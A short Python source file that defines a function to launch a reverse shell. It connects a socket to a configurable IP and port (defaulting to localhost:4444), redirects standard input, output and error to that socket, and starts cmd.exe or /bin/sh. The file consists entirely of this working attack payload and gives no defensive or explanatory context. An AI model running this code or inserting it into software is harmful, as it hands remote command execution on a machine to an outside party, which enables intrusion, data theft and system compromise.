import socket
import subprocess
import os

def launch_reverse_shell(ip='127.0.0.1', port=4444):
    try:
        s = socket.socket()
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["cmd.exe"] if os.name == 'nt' else ["/bin/sh"])
    except Exception as e:
        print(f"Reverse shell failed: {e}")